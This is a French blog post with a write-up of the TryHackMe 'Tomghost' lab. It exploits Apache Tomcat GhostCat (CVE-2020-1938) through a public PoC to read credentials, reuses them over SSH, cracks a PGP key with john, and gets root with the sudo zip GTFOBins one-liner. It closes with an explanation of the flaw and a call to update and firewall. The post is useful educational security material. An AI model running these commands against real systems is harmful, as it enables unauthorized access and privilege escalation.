---
title: "Write-up | Tomghost"
date: 2020-07-08T14:50:53+02:00
draft: false
tags:
  - writeup
  - tryhackme
---

Aujourd'hui, je m'attaque à la box tomghost, sur [Try Hack Me](https://tryhackme.com). Le nom en dit long sur cette room :)

## Reconnaissance
Je fais un `nmap` directement avec le flag `--script vuln`, car les tags de la room indiquent un numéro de CVE.
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
53/tcp   open  tcpwrapped
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
8080/tcp open  http       Apache Tomcat 9.0.30
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /examples/: Sample scripts
|_  /docs/: Potentially interesting folder
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| vulners: 
|   cpe:/a:apache:tomcat:9.0.30: 
|       CVE-2020-1938   7.5     https://vulners.com/cve/CVE-2020-1938
|       CVE-2020-1935   5.8     https://vulners.com/cve/CVE-2020-1935
|       CVE-2019-17569  5.8     https://vulners.com/cve/CVE-2019-17569
|       CVE-2020-1745   5.0     https://vulners.com/cve/CVE-2020-1745
|       CVE-2020-11996  5.0     https://vulners.com/cve/CVE-2020-11996
|_      CVE-2020-9484   4.4     https://vulners.com/cve/CVE-2020-9484
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Comme le nom de la machine laissait imaginer, on va devoir exploiter une vulnérabilité de Apache Tomcat, la CVE-2020-1938, également appelée GhostCat.

## Exploitation

Afin de pouvoir exploiter cette vulnérabilité, le port AJP (8009) doit être ouvert, ce qui est le cas ici.

Il ne semble y avoir aucun _exploit_ sur metasploit permettant d'exploiter cette vulnérabilité. Il va donc falloir en trouver un sur le net. Heureusement, de nombreuses PoC sont disponibles sur GitHub. J'utilise celui de  [00theway](https://github.com/00theway/Ghostcat-CNVD-2020-10487).

Les serveurs Apache Tomcat ont par défaut un fichier `/WEB-INF/web.xml`. Je lance donc l'_exploit_ pour lire ce fichier :
```
$ python3 exploit.py http://10.10.201.10:8080 8009 /WEB-INF/web.xml read
...
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:[edited]
  </description>

</web-app>
```
On retrouve sur cette page des identifiants. Je les teste donc en SSH, et ça marche !

Une fois connecté, je vois qu'il y a 2 fichiers dans le home dir de l'user : `credential.pgp` et `tryhackme.asc`.

* `tryhackme.asc` contient une clé privée PGP.
* `credentials.pgp` est un fichier binaire.

Je les récupère donc sur ma machine pour jouer avec :
```
$ scp skyfuck@10.10.201.10:/home/skyfuck/* Documents/tryhackme/tomghost/
skyfuck@10.10.201.10's password: 
credential.pgp        100%  394     6.8KB/s   00:00    
tryhackme.asc         100% 5144    90.1KB/s   00:00
```

J'essaie d'importer avec `gpg`, mais je n'ai pas le mot de passe. Qui on appelle quand il est question de craquer des clés ? `john` !
```
$ sudo gpg2john tryhackme.asc > hash

File tryhackme.asc

$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
...
Press 'q' or Ctrl-C to abort, almost any other key for status
[edited]        (tryhackme)
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Yes ! Ça fonctionne ! Je peux alors utiliser `gpg` :
```
$ gpg --decrypt credential.pgp 
gpg: Attention : l'algorithme de chiffrement CAST5 est introuvable
            dans les préférences du destinataire
gpg: chiffré avec une clef ELG de 1024 bits, identifiant 61E104A66184FBCC, créée le 2020-03-11
      « tryhackme <stuxnet@tryhackme.com> »
merlin:[edited]
```

Il y a donc un autre utilisateur sur la machine que `skyfuck`, je n'avais pas pensé à regarder ! Ces identifiants me permettent de me connecter en SSH entant que `merlin`. Je peux alors lire le flag `user.txt` :
```
$ cat user.txt 
THM{[edited]}
```

## Élévation de privilèges

Afin de voir comment je pourrais passer root, j'essaie d'abord `sudo -l` :
```
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```
Hmm, étrange...
Un petit tour sur [GTFOBins](https://gtfobins.github.io/) pour voir ce qu'il est possible de faire avec `zip` :

> It runs in privileged context and may be used to access the file system, escalate or maintain access with elevated privileges if enabled on sudo.

Parfait :)

```
$ TF=$(mktemp -u)
$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)

# whoami
root
# cat /root/root.txt
THM{[edited]}
```
:)

## Épilogue : un point sur Apache Tomcat et la vulnérabilité GhostCat

Apache Tomcat est un serveur web qui permet d'exécuter des applications faites en Java (.jsp...).

Dans cette room, j'ai exploité le protocole AJP qui est de base sur le port 8009. AJP (pour Apache JServ Protocol) permet la communication entre un serveur web Apache (qui reçoit les requêtes HTTP) et un serveur Tomcat (qui gère les applications Java). Le serveur Apache traduit les requêtes HTTP en requêtes AJP pour que Tomcat puisse les interpréter.

Le problème ici est que le port sur lequel tourne AJP est visible de l'extérieur. Or, le serveur Tomcat considère toutes les requêtes AJP comme étant légitimes. Dans ces requêtes, il y a un champ URI qui contient une chaine de caractères entrée par l'utilisateur. Les requêtes AJP étant considérées comme sûres par Tomcat, ce champ n'est pas controllé, ce qui permet à un attaquant de lire ou écrire des fichiers déjà présents sur le serveur. C'est ce que j'ai fait ici, en lisant le fichier `/WEB-INF/web.xml`.

Aujourd'hui, cette vulnérabilité est patchée, donc les mises à jour suffisent à éviter ce problème. Cependant, Apache Tomcat a de nombreuses vulnérabilités qui sont découvertes chaque année, et beaucoup d'entre elles sont faciles à exploiter, les _exploits_ étant publics :
```
$ searchsploit tomcat | wc -l
68
```

Morale de l'histoire : faites vos mises à jour et utilisez des pare-feux :)
